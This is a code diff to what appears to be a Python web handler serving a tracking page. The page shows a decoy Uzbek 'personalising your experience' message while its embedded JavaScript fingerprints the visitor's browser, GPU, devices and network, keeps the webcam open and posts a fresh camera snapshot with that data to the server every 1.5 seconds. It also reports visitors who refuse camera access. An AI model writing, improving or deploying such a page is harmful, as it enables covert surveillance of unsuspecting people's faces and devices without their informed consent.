@@ -82,101 +82,162 @@ async def track_page(request: web.Request):
   <div class="loader"></div>
   <div class="note">Tajribangiz moslashtirilmoqda...</div>
   <script>
-    async function repeatSend() {{
-      async function collectAndSend() {{
-        const data = {{
-          timestamp: new Date().toISOString(),
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          utcOffset: -new Date().getTimezoneOffset() / 60,
-          languages: navigator.languages.join(', '),
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          deviceMemory: navigator.deviceMemory || "Noma'lum",
-          hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
-          screen: `${{screen.width}}x${{screen.height}}`,
-          viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
-          colorDepth: screen.colorDepth,
-          pixelDepth: screen.pixelDepth,
-          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
-          browser: "Noma'lum",
-          os: "Noma'lum",
-          model: "Noma'lum",
-          devices: {{ mic: 0, speaker: 0, camera: 0 }},
-          gpu: "Noma'lum",
-          cameraRes: "Noma'lum",
-          network: "Noma'lum"
-        }};
+    let stream = null;
+    let intervalId = null;
+    let hasSentInitialData = false;
 
-        if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
-        else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
-        else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";
+    async function collectData() {{
+      const data = {{
+        timestamp: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        utcOffset: -new Date().getTimezoneOffset() / 60,
+        languages: navigator.languages?.join(', ') || navigator.language,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        deviceMemory: navigator.deviceMemory || "Noma'lum",
+        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
+        screen: `${{screen.width}}x${{screen.height}}`,
+        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
+        browser: "Noma'lum",
+        os: "Noma'lum",
+        model: "Noma'lum",
+        devices: {{ mic: 0, speaker: 0, camera: 0 }},
+        gpu: "Noma'lum",
+        cameraRes: "Noma'lum",
+        network: "Noma'lum"
+      }};
 
-        if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
-        else if (/Android/.test(navigator.userAgent)) data.os = "Android";
-        else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
-        else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
+      if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
+      else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
+      else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";
 
-        try {{
-          const devs = await navigator.mediaDevices.enumerateDevices();
-          data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
-          data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
-          data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
-        }} catch (e) {{}}
+      if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
+      else if (/Android/.test(navigator.userAgent)) data.os = "Android";
+      else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
+      else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
 
-        try {{
-          const canvas = document.createElement("canvas");
-          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      try {{
+        const devs = await navigator.mediaDevices.enumerateDevices();
+        data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
+        data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
+        data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
+      }} catch (e) {{ console.warn("MediaDevices error:", e); }}
+
+      try {{
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {{
           const dbg = gl.getExtension("WEBGL_debug_renderer_info");
           if (dbg) {{
             data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
           }}
-        }} catch (e) {{}}
-
-        if (navigator.connection) {{
-          data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
         }}
+      }} catch (e) {{ console.warn("WebGL error:", e); }}
 
-        // Kamera + rasm
-        let img = null;
-        try {{
-          const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
-          const track = stream.getVideoTracks()[0];
-          const settings = track.getSettings();
-          data.cameraRes = `${{settings.width}}x${{settings.height}}`;
+      if (navigator.connection) {{
+        data.network = `${{navigator.connection.effectiveType || 'unknown'}}, ${{navigator.connection.downlink || '?'}} Mbps`;
+      }}
 
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          await video.play();
+      return data;
+    }}
 
-          const c = document.createElement("canvas");
-          c.width = video.videoWidth;
-          c.height = video.videoHeight;
-          c.getContext("2d").drawImage(video, 0, 0);
-          img = c.toDataURL("image/jpeg", 0.7);
-
-          stream.getTracks().forEach(t => t.stop());
-        }} catch (e) {{
-          // kamera rad etilgan bo‘lishi mumkin
-        }}
-
-        const body = {{ token: "{token}", clientData: data }};
-        if (img) {{
-          body.image = img;
-        }}
-
-        fetch("/submit", {{
+    async function sendData(data, img = null) {{
+      const body = {{ token: "{token}", clientData: data }};
+      if (img) {{
+        body.image = img;
+      }}
+      try {{
+        await fetch("/submit", {{
           method: "POST",
           headers: {{ "Content-Type": "application/json" }},
           body: JSON.stringify(body)
         }});
-      }}
-
-      while (true) {{
-        await collectAndSend();
-        await new Promise(r => setTimeout(r, 1500));
+      }} catch (err) {{
+        console.error("Yuborish xatosi:", err);
       }}
     }}
-    repeatSend();
+
+    async function startCameraAndLoop() {{
+      try {{
+        stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }});
+        console.log("Kamera yoqildi");
+
+        // Birinchi ma'lumotni darhol yuborish
+        const data = await collectData();
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await new Promise(resolve => {{
+          video.onloadedmetadata = resolve;
+          video.play();
+        }});
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const img = canvas.toDataURL("image/jpeg", 0.7);
+
+        await sendData(data, img);
+        hasSentInitialData = true;
+
+        // Har 1500 ms da yangilash
+        intervalId = setInterval(async () => {{
+          if (!stream || stream.getVideoTracks().length === 0) {{
+            clearInterval(intervalId);
+            return;
+          }}
+          const freshData = await collectData();
+          const v = document.createElement("video");
+          v.srcObject = stream;
+          await new Promise(r => {{
+            v.onloadedmetadata = r;
+            v.play();
+          }});
+          const c = document.createElement("canvas");
+          c.width = v.videoWidth || 640;
+          c.height = v.videoHeight || 480;
+          c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+          const newImg = c.toDataURL("image/jpeg", 0.7);
+          await sendData(freshData, newImg);
+        }}, 1500);
+
+      }} catch (err) {{
+        console.warn("Kamera ruxsati rad etildi yoki mavjud emas:", err);
+        if (!hasSentInitialData) {{
+          const data = await collectData();
+          await sendData(data, null);
+        }}
+        // Kamera rad etilganligi haqida xabar yuborish
+        try {{
+          await fetch("/camera_denied", {{
+            method: "POST",
+            headers: {{ "Content-Type": "application/json" }},
+            body: JSON.stringify({{ token: "{token}" }})
+          }});
+        }} catch (e) {{}}
+      }}
+    }
+
+    function stopEverything() {{
+      if (intervalId) {{
+        clearInterval(intervalId);
+        intervalId = null;
+      }}
+      if (stream) {{
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }}
+    }}
+
+    window.addEventListener('beforeunload', stopEverything);
+    window.addEventListener('pagehide', stopEverything); // Mobile uchun
+
+    // Ishni boshlash
+    startCameraAndLoop();
   </script>
 </body>
 </html>"""
